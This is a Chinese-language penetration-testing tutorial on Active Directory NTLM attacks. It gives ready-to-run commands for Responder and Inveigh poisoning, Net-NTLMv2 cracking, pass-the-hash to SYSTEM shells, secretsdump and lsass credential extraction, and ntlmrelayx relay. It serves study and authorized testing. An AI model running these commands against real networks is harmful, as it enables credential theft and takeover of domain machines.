## 理論基礎：AD 有兩套認證協定

### NTLM 認證（挑戰-回應）

```
客戶端                    伺服器
   │── NEGOTIATE ────────→│   （我想認證）
   │←── CHALLENGE ────────│   （給你一個隨機挑戰值）
   │── AUTHENTICATE ──────→│   （用密碼 hash 對挑戰值做計算，送回去）
   │                        │   （伺服器用同樣方式驗算，一致就過）
```

**關鍵：密碼從不直接傳輸**，傳的是 hash 對挑戰值的運算結果（Net-NTLMv2）。

**NTLM Hash vs Net-NTLMv2 的差異（非常重要）：**

| | NTLM Hash | Net-NTLMv2 |
|--|-----------|------------|
| 也叫 | NT hash | NTLMv2 response |
| 格式 | `aad3b435b51404ee...` | `user::domain:challenge:hash:blob` |
| hashcat 模式 | `-m 1000` | `-m 5600` |
| 能 PTH 嗎 | ✅ 能直接用於 PTH | ❌ 不能，只能離線破解 |
| 哪裡抓到 | lsass、secretsdump | Responder/Inveigh 捕捉 |

### Kerberos 認證

流程見 75-Kerberos攻擊。核心差異：Kerberos 是票證式，認證中心是 DC 的 KDC，不是目標機自己驗。

---

## NTLM 認證的弱點

| 弱點 | 攻擊手法 | 原理 |
|------|---------|------|
| Hash 可直接當密碼用 | Pass-the-Hash | NTLM 認證只要 hash，不需要明文 |
| 挑戰回應可被捕捉 | LLMNR/NBT-NS 毒化 | 偽造名稱解析回應，讓目標送 Net-NTLMv2 給你 |
| 捕捉到的 hash 可破解 | hashcat -m 5600 | Net-NTLMv2 是可離線暴力破解的 |
| 可中繼轉發 | NTLM Relay | 捕捉到認證後轉給其他服務，不需要破解 |

---

## 判斷用哪種攻擊

```
你有什麼？
├── 有明文密碼 → 直接用（nxc / evil-winrm / psexec）
├── 有 NTLM hash（lsass / secretsdump 取得）
│   ├── PTH：nxc smb TARGET -u user -H HASH
│   └── Overpass-the-Hash：getTGT.py 換成 Kerberos ticket
├── 有 Net-NTLMv2（Responder 捕捉）
│   ├── 破解：hashcat -m 5600
│   └── 中繼：ntlmrelayx.py 轉給其他機器
└── 什麼都沒有 → Responder 毒化等目標送 hash 過來
```

## 實作：LLMNR/NBT-NS 毒化（Responder）

### 原理

Windows 找不到主機名稱時，會廣播 LLMNR/NBT-NS 詢問。Responder 回應「我就是那台主機」，讓目標把 Net-NTLMv2 送過來。

### 執行

```bash
# 啟動 Responder（監聽內網介面）
sudo responder -I eth0 -wv
# -I eth0  → 監聽的網路介面（改成你的介面名）
# -w       → 啟動 WPAD 代理毒化（讓更多流量過來）
# -v       → verbose，顯示捕捉到的 hash

# 等待目標觸發（例如存取不存在的 UNC 路徑）
# 捕捉到的 hash 存在：/usr/share/responder/logs/

# 破解
hashcat -m 5600 /usr/share/responder/logs/NTLMv2-*.txt \
  /usr/share/wordlists/rockyou.txt --force
# -m 5600 → Net-NTLMv2 格式
```

### Inveigh（Windows 上，PowerShell）

```powershell
# 在已控制的 Windows 主機上跑
Import-Module Inveigh
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -Proxy Y
# -ConsoleOutput Y → 即時顯示捕捉結果
# -LLMNR Y        → 啟用 LLMNR 毒化
# -NBNS Y         → 啟用 NetBIOS 毒化
```

## Pass-the-Hash（PTH）

### 原理

NTLM 認證只需要 hash，不需要明文密碼。有了 NTLM hash 就等於有了密碼。

### 執行

```bash
# nxc（最常用，快速確認）
nxc smb TARGET -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:NTLM_HASH'
# -H  → 格式是 LM:NT，LM 不知道就放空的（aad3b435...）

# evil-winrm（WinRM PTH）
evil-winrm -i TARGET -u Administrator -H NTLM_HASH

# impacket psexec（取得 SYSTEM shell）
python3 psexec.py -hashes :NTLM_HASH Administrator@TARGET

# impacket wmiexec（更隱蔽）
python3 wmiexec.py -hashes :NTLM_HASH Administrator@TARGET

# secretsdump（用 hash 做 DCSync）
python3 secretsdump.py -hashes :NTLM_HASH Administrator@DC_IP
```

### 取得 NTLM hash 的方式

```bash
# 方法一：secretsdump（有帳號密碼/有 local admin）
python3 secretsdump.py DOMAIN/Administrator:Password@TARGET
python3 secretsdump.py -hashes :HASH Administrator@TARGET

# 方法二：從 lsass dump 提取（pypykatz）
pypykatz lsa minidump lsass.dmp
# 找 NT: 欄位後面的 hash

# 方法三：nxc
nxc smb TARGET -u Administrator -p 'Password' --sam   # SAM database
nxc smb TARGET -u Administrator -p 'Password' --lsa   # LSA secrets
```

## NTLM Relay

### 原理

不破解 Net-NTLMv2，直接把它轉發給另一台機器做認證。如果那台機器接受，就拿到那台機器的存取權。

### 執行

```bash
# 停掉 Responder 的 SMB/HTTP（只要毒化，不要自己接）
sudo nano /etc/responder/Responder.conf
# SMB = Off
# HTTP = Off

# 啟動 Responder 毒化
sudo responder -I eth0 -wv

# 同時啟動 ntlmrelayx（轉發到目標）
python3 ntlmrelayx.py -tf /tmp/targets.txt -smb2support
# -tf targets.txt   → 要轉發到的目標清單（一行一個 IP）
# -smb2support      → 支援 SMB2
# 預設會 dump 目標的 SAM database

# 互動式 shell（加 -i）
python3 ntlmrelayx.py -tf /tmp/targets.txt -smb2support -i
# 連到 ntlmrelayx 開的本地 port 取得 shell
nc 127.0.0.1 11000
```

## 速查表

```bash
# Responder 捕捉
sudo responder -I eth0 -wv

python3 psexec.py -hashes :HASH Administrator@TARGET

# secretsdump
python3 secretsdump.py DOMAIN/user:pass@TARGET

# NTLM Relay
python3 ntlmrelayx.py -tf targets.txt -smb2support
```
